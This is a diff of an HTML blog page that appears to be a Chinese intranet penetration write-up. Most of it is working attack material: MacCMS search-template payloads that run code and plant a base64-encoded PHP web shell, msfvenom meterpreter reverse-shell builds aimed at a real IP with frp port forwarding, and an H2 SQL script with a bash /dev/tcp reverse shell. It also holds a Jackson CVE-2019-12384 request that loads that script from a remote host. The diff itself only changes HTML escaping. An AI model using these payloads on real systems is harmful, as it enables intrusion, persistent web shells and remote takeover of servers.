@@ -8,8 +8,7 @@
     <meta name="description" content="linux内网1苹果cms：
 有个rce的洞：
 getshell payload（a）:
-index.php?m=vod-search&amp;amp;wd={if-A:assert($_POST[a])}{endif-A}
-fput写马，test">
+index.php?m=vod-search&amp;amp;wd=&amp;amp;#123;if-A:assert($_POST[a])&amp;amp;#125;&amp;am">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -34,9 +33,9 @@ fput写马，test">
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
+<meta name="generator" content="Hexo 5.4.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -447,9 +446,9 @@ fput写马，test">
                 <h2 id="linux内网1"><a href="#linux内网1" class="headerlink" title="linux内网1"></a>linux内网1</h2><p>苹果cms：<br><img src="https://img-blog.csdnimg.cn/01338bfbd6504222843519aca2c21c18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
 <p>有个rce的洞：</p>
 <pre class=" language-html"><code class="language-html">getshell payload（a）:
-index.php?m=vod-search&amp;wd={if-A:assert($_POST[a])}{endif-A}
+index.php?m=vod-search&amp;wd=<span class="token entity" title="{">&amp;#123;</span>if-A:assert($_POST[a])<span class="token entity" title="}">&amp;#125;</span><span class="token entity" title="{">&amp;#123;</span>endif-A<span class="token entity" title="}">&amp;#125;</span>
 fput写马，test.php 密码test:
-index.php?m=vod-search&amp;wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A}
+index.php?m=vod-search&amp;wd=<span class="token entity" title="{">&amp;#123;</span>if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)<span class="token entity" title="}">&amp;#125;</span><span class="token entity" title="{">&amp;#123;</span>endif-A<span class="token entity" title="}">&amp;#125;</span>
  
 </code></pre>
 <p>上线msf，因为我的msf没部署在公网服务器上是部署在本地的mac上的，所以先用frp映射几个端口，frpc.ini：</p>
@@ -483,7 +482,7 @@ bind_addr = 0.0.0.0
 bind_port = 7000
 </code></pre>
 <p>msf生成木马：</p>
-<pre class=" language-html"><code class="language-html">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=121.41.55.60 LPORT=8000 SessionCommunicationTimeout=0 -f elf > w1.elf
+<pre class=" language-html"><code class="language-html">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=121.41.55.60 LPORT=8000 SessionCommunicationTimeout=0 -f elf &gt; w1.elf
 </code></pre>
 <p>开下监听，shell回来了：<br><img src="https://img-blog.csdnimg.cn/f8769298099b4954bc3f1232c1c56455.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>加路由，看下内网，这台主机有两个内网网段：<br><img src="https://img-blog.csdnimg.cn/3a162bd8352041289b3566da09bca89a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>收集到的信息：</p>
 <pre class=" language-xml"><code class="language-xml">172.18.16.1:9000 open
@@ -516,7 +515,7 @@ bind_port = 7000
 <p><img src="https://img-blog.csdnimg.cn/c00fd2bfcc804eeca8f01906d8ce8081.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>shell过来了：<br><img src="https://img-blog.csdnimg.cn/2cf9aa089ce14ac290b766ccda35ac8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>联网的，可以wget上线下，加下路由再信息探测一波：<br>192.168.13.159开着redis，主从复制rce：</p>
 <p><img src="https://img-blog.csdnimg.cn/a74f67b504ec49df85a9d2b8a4b59a5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/b5a3bcff288448a6884f7043bb9c0263.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>还剩最后一个：<br><img src="https://img-blog.csdnimg.cn/bd0537fb7c514b94aea31b5b4e2d7155.png"><br>CVE-2019-12384 Jackson 远程代码执行漏洞：</p>
 <p>首先在vps上放置一个.sql的文件，内容如下：</p>
-<pre class=" language-xml"><code class="language-xml">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {        String[] command = {"bash", "-c", cmd};        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");        return s.hasNext() ? s.next() : "";  }$$;CALL SHELLEXEC('bash -i >&amp; /dev/tcp/xxxxx/7777 0>&amp;1')
+<pre class=" language-xml"><code class="language-xml">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException <span class="token entity" title="{">&amp;#123;</span>        String[] command = <span class="token entity" title="{">&amp;#123;</span>"bash", "-c", cmd<span class="token entity" title="}">&amp;#125;</span>;        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");        return s.hasNext() ? s.next() : "";  <span class="token entity" title="}">&amp;#125;</span>$$;CALL SHELLEXEC('bash -i &gt;&amp; /dev/tcp/xxxxx/7777 0&gt;&amp;1')
 </code></pre>
 <p>然后发送payload，请求远程的sql文件，进行RCE</p>
 <pre class=" language-xml"><code class="language-xml">POST /fuckme HTTP/1.1
@@ -529,7 +528,7 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 164
 
-poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://xxxxxx/exp.sql'"}]
+poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", <span class="token entity" title="{">&amp;#123;</span>"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://xxxxxx/exp.sql'"<span class="token entity" title="}">&amp;#125;</span>]
 </code></pre>
 <p>至此基本打完所有段</p>
 <h2 id="linux内网2"><a href="#linux内网2" class="headerlink" title="linux内网2"></a>linux内网2</h2><p>入口页面：<br><img src="https://img-blog.csdnimg.cn/c1a3e07922854a0d849ab3cb390f66cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
@@ -564,7 +563,7 @@ bind_addr = 0.0.0.0
 bind_port = 7000
 </code></pre>
 <p>msf生成马儿：</p>
-<pre class=" language-xml"><code class="language-xml">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=121.41.55.60 LPORT=6000 SessionCommunicationTimeout=0 -f elf > w1.elf
+<pre class=" language-xml"><code class="language-xml">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=121.41.55.60 LPORT=6000 SessionCommunicationTimeout=0 -f elf &gt; w1.elf
 
 
 SessionCommunicationTimeout=0 msf中的session当没有什么动作时会很快就会自动关闭，此参数可以不让他关闭
